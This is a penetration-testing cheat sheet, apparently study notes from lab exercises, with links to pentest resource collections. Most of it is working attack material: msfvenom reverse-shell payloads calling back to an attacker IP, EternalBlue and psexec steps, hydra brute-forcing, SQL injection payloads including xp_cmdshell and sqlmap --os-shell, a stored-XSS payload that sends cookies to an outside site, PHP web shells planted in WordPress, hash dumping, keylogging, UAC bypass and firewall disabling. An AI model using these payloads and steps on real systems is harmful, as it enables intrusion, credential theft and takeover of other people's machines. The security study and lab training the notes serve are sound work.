Collection of Penetration Testing Resources, Cheat sheets, Mind map & Tools - [1500+ Resources, 2300+ Tools]

* Hacktricks
book.hacktricks.xyz

* Cheatsheet God
https://github.com/OlivierLaflamme/Cheatsheet-God

• 𝗔𝘄𝗲𝘀𝗼𝗺𝗲-𝗣𝗲𝗻𝘁𝗲𝘀𝘁 𝗖𝗼𝗹𝗹𝗲𝗰𝘁𝗶𝗼𝗻:
https://github.com/Muhammd/Awesome-Pentest

• 𝗣𝗘𝗡𝗧𝗘𝗦𝗧𝗜𝗡𝗚-𝗕𝗜𝗕𝗟𝗘 [𝗖𝗼𝗹𝗹𝗲𝗰𝘁𝗶𝗼𝗻 𝗼𝗳 𝗩𝗮𝗿𝗶𝗼𝘂𝘀 𝗣𝗲𝗻𝘁𝗲𝘀𝘁 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲𝘀 & 𝗧𝗼𝗼𝗹𝘀] [𝟭𝟱𝟬𝟬+ 𝗔𝗿𝘁𝗶𝗰𝗹𝗲𝘀]
https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE

• 𝗣𝗲𝗻𝘁𝗲𝘀𝘁-𝘄𝗶𝗸𝗶
https://github.com/nixawk/pentest-wiki

• 𝗣𝗲𝗻𝗲𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 - 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗨𝗽 𝘁𝗵𝗲 𝗟𝗮𝗯 𝗘𝗻𝘃𝗶𝗿𝗼𝗻𝗺𝗲𝗻𝘁
https://github.com/ND13/Penetration-Testing-and-Hacking

• 𝗣𝗘𝗡𝗘𝗧𝗥𝗔𝗧𝗜𝗢𝗡 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗣𝗥𝗔𝗖𝗧𝗜𝗖𝗘 𝗟𝗔𝗕 [𝗠𝗜𝗡𝗗𝗠𝗔𝗣]:
https://www.amanhardikar.com/mindmaps/Practice.html

• 𝗣𝗲𝗻𝘁𝗲𝘀𝘁𝗶𝗻𝗴 𝗖𝗵𝗲𝗮𝘁𝘀𝗵𝗲𝗲𝘁:
https://hausec.com/pentesting-cheatsheet/

• 𝗣𝗲𝗻𝗲𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 𝗧𝗼𝗼𝗹𝘀 𝗟𝗶𝘀𝘁 [𝟮𝟯𝟬𝟬+ 𝗧𝗼𝗼𝗹𝘀]:
https://en.kali.tools/all/

# Passive OS Fingerprinting:
#1 Tool to use p0f:
	p0f -i any -p -o /tmp/sniff.log
	From victim opgn terminal and connect to FTP:
		p0f captures all data !

#2 Pentesting RPC Service and NFS Shares:
	nmap -T4 -A Target_IP
	rpcinfo -p Target_IP
	showmount -e Target_IP
	mount -t nfs Target_IP:/home /mnt -o nolock
	Now you will be able to access the mounted filesin /mnt

#3 Enumerating Logged on users using Finger:
	nmap -p 79 Target_IP
	finger @Target_IP --> Displays all logged on users.
	finger Admin@Target_IP
	telnet Target_IP 79
	Recommended Fix: Edit the finger txt file in /etc/xinetd.d

#4 MITM Using Cain & Able:
	Open Cain & Able
	Configuration --> Sniffer --> CHoose Network card --> Start/Stop Sniffer
	Click top & '+' button --> Choose Range and scan --> ARP --> Add to route Two IP Adderesses --> Start/Stop ARP Wait for victim to login and you get the creds in Password.


#5 Weak Passwords --> L0phtCrack:
	Install L0phtCrask --> Proceed with trial
	--> WIndows --> REmote Machine --> Give IP --> Quick Pass Audit --> Finish
	--> You can export the reports in the reports tab.

#6 Automating PenTest Tasks using Bash scripts:
	#!/bin/bash
	tput clear
	
	#Nmap Host Identification
	echo "Here, you are going to perform an nmap scan for live hosts which have FTP port open on them"
	echo "Please Enter the Scan Range"
	read ip_range
	nmap -sP $ip_range -oG out.txt
	cat out.txt | grep Up > out1.txt
	cat out1.txt | cut -d " " -f2 > open.txt

	# Nmap FTP Scan
	nmap -p 21 cat open.txt -oG final.txt
	cat final.txt | grep open > ftp.txt
	echo ""
	echo "Nmap has performed a scan to identify the hosts with FTP"
	cat ftp.txt | cut -d " " -f2
	
	# FTP Dictionary Attack:
	echo ""
	echo "Enter the IP Address of the machine on which you want to perform FTP Dictionary attack"
	echo "The script wwill perform dictionary attack using hydra"
	read ip_addr
	hydra -L /root/Wordlists/Usernaes.txt -P /root/Wordlists/Passwords.txt ftp://$ip_addr
	echo ""
	echo "Now that you have obtained the credentials, let us login to the FFTP Server"
	read ftp_ip
	ftp $ftp_ip

#7 Gaining Remote access to windows Machine:
	nmap -T3 -sT -sU -A 172.20.20.11
	msfconsole
	use auxiliary/scanner/snmp/snmp_login
	options
	setg RHOSTS Target_IP
	exploit
	use auxiliary/scanner/snmp/snmp_enum
	exploit
	Save all usernames in a text file
	use this set of usernames to brute force against SMB and SNMP
	hydra -L /root/Username.txt -P /root/Wordlists/Passwords.txt 172.20.20.11 smb
	Login to smb:
	use exploit/windowss/smb/psexec
	options
	set rhost, smbuser, smbpass
	exploit

#8 Vulnerability Scanning using OPENVas:

#9 Windows OS Exploits:
	Perform a nmap and Nessus Scan
	msfconsole
	search smb_ms17_010
	use it and scan the target
	search eternal_blue
	set rhost 172.20.20.9
	set processinject lsass.exe
	set targetarchitecture x64
	set payload windows/x64/meterpreter/reverse_tcp
	set lhost 172.20.20.21

#10 Exploiting & Escalating Privileges on a Windows Operating System:
	Develope a Payload:
	msfvenom -p windows/meterpreter/reverse_tcp -e x86 /shikata_ga_nai -i 5 -b '\x00' LHOST=172.20.20.21 LPORT=443 -f exe -o shikata.exe
	Transport the payload using python:
	python3 -m http.server
	Gain a revshell and getsyetem, hashdump
	Crack hashes using John the ripper.
	sOME VM MIGHT RUN INTO ISSUES --> export CPUID_DISABLE=1
	john --format=nt hashes.txt

Web Application Pentesting:
#1 Gathering Info ABout Tarteg - WhatWeb
	whatweb -v Target.com
	whatweb --log-verbose=report target.com

#2 Web APplication Vuln Assest Using Vega:
	Start Vega --> Start New Scan --> Enter target.com
	Choose injection modules and finish.
	See the results and use them to perform further attacks
	XSS:
	target.com --> contacts --> Comments --> <script>alert("XSS ALERT")</script>
	SQLi:
	Save request in a file
	sqlmap -r request --risk 3 --level 5 --batch --dbs
	sqlmap -u "www.target.com" --method POST --data "COPY DATA FROM VEGA" --dbs
	- SKIP OTHER TESTING (if any)?	Also Check for spaces
	Dump the creds and obtain passwords !


#3 Pentesting Web Application for stored XSS & Parameter Manipulation
	Mscope --> Blog -> Comments
	EG Payload: <a onclick="document.location='http://www.oceanplaza.com/Default.aspx?cookie='+escape(document.cookie);"href="#"> Please Click hear to Visit Website </a>
	Post the comment and access it from different user.
	Eg: Login as sam test --> Admin
	The collected session token is located in C:\inetpub\wwwroot\oceanplaza\Cookiesteal
	Also try changing the ID Value in viewprofile --> MIght change to different accounts

#5 Exploiting Direcroty Traversal Wordpress:
	wpscan --url http://target.com/wordpress --enumerate p
	Look for ebook download plugin
	searchsploit ebook download 1.1
	Perform Path Traversal --> Crack passwords using passwd & shadow files

#6 Dictionary Attack on a wordpress web application using Burp/WPScan
	wpscan --usernames user.txt --wordlist pass.txt --url target.com/wordpress
	In burp --> Send request to intruder --> Cluster bomb --> Choose payload positions
	--> CHoose payload set 1 & 2 --> start attack --> Login and upload a shell

#7 Wordpress upload vulnerability:
	Login with the cracked credentials --> mike/prince
	In most cases you can edit a PHP PAGE --> Eg: 404.php with a revshell file
	use pentestmoney revshell locates at /usr/share/webshells/php
	
#8 DirSearch and Access shell - Wordpress:
	The 404.php is usually located in 
	/wordpress/wp-content/themes/<Theme name eg: twentyseventeen/404.php

#9 Apache Web Server Vuln:
	dirbuster http://172.19.19.19/ --> /usr/share/dirbuster/wordlist/2.3-medium.txt
	Exploit Shellshock

Database Pentesting:
#1 MySQL Database:
	metasploit --> auxiliary/scanner/mysql/mysql_login
	options
	set username root, rhosts, set pass file pass.txt
	run
	Metasploit --> use auxiliary/admin/mysql/mysql_sql
	set rhost , username, pass, SQL show databases;
	run

#3 Injection Attacks MySQL:
	Visit domain target.com/goodshopping
	MyAccount --> Login --> lol' or 1=1 --
	Logout --> lol';insert into login values ('sandra','sandra123');--
	Login to new created account
	Command Exec through SQLi
	Username field --> lol';exec master..xp_cmdshell 'ping www.google.com -i 65000 -t';--
	Inspect element --> console document.cookie --> copy cookie value
	sqlmap -u <URL> -cookie=<COOKIE VALUE> --dbs
	Gain shell --> sqlmap -u <URL> -cookie=<COOKIE VALUE> --os-shell

Manual SQL Injection dvwa:
Payloads	
	#1 %' or '0'='0
	It will run this statement --> 
            mysql> SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';

	#2 Display Database Version
		%' or 0=0 union select null, version() #

	#3 Display Database User
        %' or 0=0 union select null, user() #
	
	#4 Display Database name
		%' or 0=0 union select null, database() #

	#5 Display all tables in Information_Schema or any other dbs
		%' and 1=0 union select null, table_name from information_schema.tables #

	#6 Display all users in table Information_Schema
		%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
	
	#7 Display all the columns fields in the information_schema user table
        %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #

	#8 Display all the columns field contents in the information_schema user table
        %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #

Automating SQL Injection dvwa - sqlmap
	Obtain Database User For DVWA

    Notes(FYI):
        Obtain the referer link from (Section 9, Step 10), which is placed after the "-u" flag below.
        Obtain the cookie line from (Section 9, Step 10), which is placed after the "--cookie" flag below.
        Replace 192.168.1.106 with Fedora's IP address obtained in (Section 3, Step 3).
        Replace (lpb5g4uss9kp70p8jccjeks621) with your PHPSESSID obtained from (Section 9, Step 10).
    Instructions:
        ./sqlmap.py -u "http://192.168.1.106/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -b --current-db --current-user
            -u, Target URL
            --cookie, HTTP Cookie header
            -b, Retrieve DBMS banner
            --current-db, Retrieve DBMS current database
            --current-user, Retrieve DBMS current user
	Alternatively save request from burp and automate through the request file.

XSS Stored using Upload:
	Testing --> <script>alert("This is a XSS Exploit Test")</script>
	Iframe Injection --> <iframe src="http://www.blankdash.ninja"></iframe>
	Cookie --> <script>alert(document.cookie)</script>
	Malicious FIle Upload revshell --> <script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script>

CSRF dvwa:
	Your string should now look like the below line and picture
	Run this in stored XSS --> <script>alert(document.cookie)</script>

    curl --cookie "security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0" --location "http://192.168.1.106/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change#"

Replace the "test123" password with "password"

    curl --cookie "security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0" --location "http://192.168.1.106/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#"


Using burp as MITM
	curl -b "security=high; PHPSESSID=reoctn5dfb89qlcggl2sm5jfe4" --location "http://192.168.1.106/dvwa/index.php" | grep -i Welcome

Tools & Usecases:
Enumeration:
NetBIOS - Global Network Inventory --> Install & Run
	--> IP Range scan --> Connect as Administrator or other user
	--> After scan check info like NetBIOS, User Groups, shares etc.
Nbtstat --> nbtstat -A <IP>
SNMP Enumeration -- Metasploit
	--> Nmap snmp_brute script
	--> snmp_enum & snmp_login Metasploit
LDAP - Active directory:
ADexplorer --> run the tool --> connect to target_ip
	--> Explore domain users and modify them.
Misc
	--> Enum4linux
	--> Superscan
	--> Hyena
	--> Netbios Emulator
	--> Softperfect
	
VA
	--> Nessus
	--> GFI Languard 
	--> Nikto --> nikto -h target_ip -Tuning x
	
Sys Hacking
	--> Responder for active password attacks 
	From kali: responder -I eth0	From Target: pushd \\service\share
	
	--> Dumping creds:
	wmic -- wmic useraccount get name,sid
	pwdump -- pwdump.exe -o hashes.txt -x 127.0.0.1
	use wce.exe works well 
	After extracting passwords can cracking it using the following tools
	--> John --> can use rockyou wordlist
	--> ophcrack --> load hashes and use vista free tables
	--> Rainbowtables --> Rcrack GUI, WinRTgen or Commandline rcrack.exe
	--> Can do PassTheHash attack using pth-winexe, psexec.py
	--> Can use L0phtcrack to audit for passwords
	
	--> Exploiting Client side attacks
	--> Develop a payload --> msfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe
	--> Setup handler --> msfconsole --> use exploit/multi/handler --> set LHOST, LPORT, payload & run
	--> Use payload on victim --> can use python3 -m http.server to download payload to victim
	--> meterpreter --> run vun --> grants vnc sessions
	--> getuid, sysinfo 
	--> Dumping Creds --> hashdump , if it dosw not work 
	--> background --> use post/windows/gather/smart_hashdump --> set session <ID -- run 
	--> If it dose not work --> Escalate priv using --> getsystem
	--> if it dosw not work --> background --> search bypass_uac --> use exploit/windows/local/bypass_fodhelper
	--> else --> run post exploit suggester to know more of the priv esc vectors
	--> Now dump the creds using smart_hashdump or hashdump
	
	--> Post exploitation:
	--> This workd in my custom VM --> exploit/windows/local/bypassuac_sdclt
	--> getuid, sysinfo, keyscan_start, keyscan_dump, search -f "filename", cat, ls, pwd, ideltime, shell, shutdown, help
	
	--> Some offensive Sypware:
	--> Spyagent
	--> Powerspy
	
	--> Steganography
	--> NTFS Streams: Hiding files into NTFS Streams & Reading them
	--> snow --> Whitespace steganography
	--> Openstgeo
	--> Quickstego
	--> Misc: steghide, binwalk, strings, exiftool, winhex, hexedit
	
	--> Covert Channels
	--> Should have the covert tcp c program in both communicating partys
	--> compile the covert tcp c file using cc --> cc -o covert_tcp covert_tcp.c
	--> ./covert_tcp -dest Reciver_IP -source Sender_IP -source_port Sender_Port -dest_port Reciver_Port -file output.txt / send.txt
	--> Sender: sudo ./covert -dest 10.0.2.16 -source 10.0.2.4 -source_port 5555 -dest_port 5555 -file send.txt
	--> Reciver: sudo ./covert -dest 10.0.2.16 -source 10.0.2.4 -source_port 5555 -dest_port 5555 -server -file reciver.txt
	--> Perform a packet analysis
	
Sniffing
	--> Wireshark
	--> Packet sniffing on a insecure network and viewing results in follow_tcp stream
	--> Packet sniffing on a remote machine
		--> run --> services.msc --> remote packet capture protocol --> start
		--> wireshark --> capture --> options --> Manage interfaces --> Remote Interfaces --> Add --> IP / PORT 2002 /Username / Password --> Start capture
	--> Wireshark --> Detect ARP Poisoning
	--> ARP Poisoning:
		--> Cain & Able --> Configute --> Choose adapter apply/ok --> Start sniffer --> sniffer add --> Scan range All tests
		--> ARP add source & Dest --> ARP Poisining
	--> Wireshark --> Edit --> Preferences --> Protocol --> ARP/RARP --> Detect arp request --> Start sniffing
	--> Detection --> Analyze --> Expert Information

IDS/IPS Evasions
	--> Nmap Evasion Techniques
		--> nmap -h
		--> nmap -v -sS -T5 target_ip
		--> nmap -v -sS -f -T5 target_ip
		--> nmap -v -sS -f --mtu 32 -T5 target_ip
		--> nmap -v -sS --mtu 32 --send-eth -T5 target_ip
		--> nmap -v -sS -f --mtu 32 --send-eth --data-length 500 -T5 target_ip
		--> nmap -v -sS -f --mtu 32 -send-eth --data-length 50 --source-port 99 -T5 target_ip
	
	--> Metasploit
		--> Develope an encoded payload
		--> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o payload.exe
		--> Set up handler & Gain access
		--> Post Exploitation
		--> ececute -f cmd.exe -c -H
		--> shell
		--> netsh firewall show opmode 
		--> netsh advfirewall set allprofiles state off
		--> getsystem
		
Web Server / Application
	--> Passive Recon
	--> skipfish --> skipfish -S /usr/share/skipfish/dictionaries/complete.wl -o output.txt <TARGET URL>
	--> Dirsearch / Dirb / Dirbuster / HTTPRecon / ID Serve/ all should work fine
	--> Uniscan --> uniscan -u <URL> -q
	--> Cracking FTP / SSH / Telnet credentials using Hydra / Medusa / Metasploit
	--> XSS --> Try perform Stored XSS on blog --> comments
	--> CSRF--> wpscan -u <URL> --enumerate -vp --> look for wordpress firewall CSRF
	--> Sample payload: Should be run on victim device as html
<form method="POST" action="http://target_ip:8080/wp-admin/options=general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php"

<script>alert("Enable security, click submit")</script>
<input type="hidden" name="whitelisted_ip[]" value="NEW_IP">
<input type="hidden" name="set_whitelist_ip" value="Set Whitelisted IPs" class="button-secondary">
<input type="submit">
<form>
	--> WPSCAN --> wpscan --url <URL> --enumerate u
	--> Metasploit --> wordpress_login_enum --> set passfile and set username admin to brute force
	--> DVWA --> Command Injection in windows --> File upload using magic bytes
		--> Adding user through command injection --> | net user --> |net user hello /Add --> | net localgroup Administrators hello /Add
	--> Misc: Vega & Acunetix

Cloud Computing
	--> Default creds --> admin:test@123
	--> http://ip/owncloud
	--> install owncloud --> server address http://IP/owncloud 
	--> Input credentials & Sync Everything
	--> Shared files can be accessed in c:\users\administrator\owncloud
	--> you can even put a file in the folder for it to snyc everwhere

Cryptography
Veracrypt --> Mount the disk file in veracrypt and use the key file or password to mount the drive and access its contents.	
		
